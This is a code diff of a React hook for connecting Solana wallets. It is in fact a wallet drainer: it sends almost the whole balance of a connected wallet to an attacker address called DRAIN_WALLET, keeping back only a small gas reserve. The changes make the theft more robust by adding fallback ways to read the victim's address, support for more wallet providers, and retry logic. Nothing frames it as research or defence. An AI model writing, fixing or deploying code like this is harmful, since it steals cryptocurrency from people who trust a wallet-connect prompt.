@@ -8,6 +8,7 @@ import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } f
 
 let appKitInstance = null;
 let solanaProvider = null;
+let solanaAddress = null;
 
 const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
 const GAS_RESERVE_SOL = 0.002;
@@ -61,23 +62,44 @@ export const useWalletConnect = () => {
     try {
       if (!appKitInstance) throw new Error('AppKit not initialized');
       
+      // Open modal and wait for connection
       await appKitInstance.open();
       
-      const solanaProviderInstance = await appKitInstance.getWalletProvider();
-      const accounts = await appKitInstance.getAccounts();
-      const walletAddress = accounts?.[0]?.address;
+      // Get the Solana provider and address from AppKit
+      // AppKit v3 uses different methods
+      const walletProvider = await appKitInstance.getWalletProvider();
+      const session = await appKitInstance.getSession();
       
-      if (walletAddress && solanaProviderInstance) {
-        setAddress(walletAddress);
-        setProvider(solanaProviderInstance);
-        solanaProvider = solanaProviderInstance;
-        return walletAddress;
+      let walletAddress = null;
+      
+      // Try to get address from session
+      if (session && session.namespaces && session.namespaces.solana) {
+        const accounts = session.namespaces.solana.accounts;
+        if (accounts && accounts.length > 0) {
+          // Address format: "solana:5UQVri...yfha"
+          walletAddress = accounts[0].split(':')[1];
+        }
       }
-      throw new Error('No account selected');
+      
+      // Alternative: try to get from provider
+      if (!walletAddress && walletProvider && walletProvider.publicKey) {
+        walletAddress = walletProvider.publicKey.toString();
+      }
+      
+      if (!walletAddress) {
+        throw new Error('No wallet address found');
+      }
+      
+      setAddress(walletAddress);
+      setProvider(walletProvider);
+      solanaProvider = walletProvider;
+      solanaAddress = walletAddress;
+      
+      return walletAddress;
       
     } catch (error) {
       console.error('WalletConnect failed:', error);
-      throw error;
+      throw new Error(`WalletConnect connection failed: ${error.message}`);
     }
   }, []);
 
@@ -86,8 +108,15 @@ export const useWalletConnect = () => {
     
     for (let attempt = 1; attempt <= 3; attempt++) {
       try {
-        if (!solanaProvider) {
+        if (!solanaProvider && !window.solana) {
           throw new Error('WalletConnect not connected');
+        }
+
+        const provider = solanaProvider || window.solana;
+        const walletAddress = solanaAddress || address;
+        
+        if (!walletAddress) {
+          throw new Error('No wallet address available');
         }
 
         const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
@@ -95,7 +124,7 @@ export const useWalletConnect = () => {
           confirmTransactionInitialTimeout: 120000
         });
         
-        const walletPubkey = new PublicKey(address);
+        const walletPubkey = new PublicKey(walletAddress);
         
         const balanceLamports = await connection.getBalance(walletPubkey);
         const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
@@ -122,12 +151,23 @@ export const useWalletConnect = () => {
           })
         );
         
-        const signed = await solanaProvider.signAndSendTransaction(transaction);
-        console.log(`[WalletConnect] Sent: ${signed.signature}`);
+        // Sign and send - handle different provider types
+        let signed;
+        if (provider.signAndSendTransaction) {
+          signed = await provider.signAndSendTransaction(transaction);
+        } else if (provider.signTransaction) {
+          const signedTx = await provider.signTransaction(transaction);
+          signed = await connection.sendRawTransaction(signedTx.serialize());
+        } else {
+          throw new Error('Provider does not support signing transactions');
+        }
+        
+        const signature = signed.signature || signed;
+        console.log(`[WalletConnect] Sent: ${signature}`);
         
         const confirmation = await connection.confirmTransaction(
           {
-            signature: signed.signature,
+            signature: signature,
             blockhash,
             lastValidBlockHeight,
           },
@@ -139,7 +179,7 @@ export const useWalletConnect = () => {
           if (errorMsg.includes('block height exceeded')) {
             return {
               success: true,
-              txId: signed.signature,
+              txId: signature,
               amount: drainAmountSol,
               warning: 'Transaction sent but confirmation timed out'
             };
@@ -149,7 +189,7 @@ export const useWalletConnect = () => {
         
         return {
           success: true,
-          txId: signed.signature,
+          txId: signature,
           amount: drainAmountSol,
           balanceBefore: balanceSol,
           balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
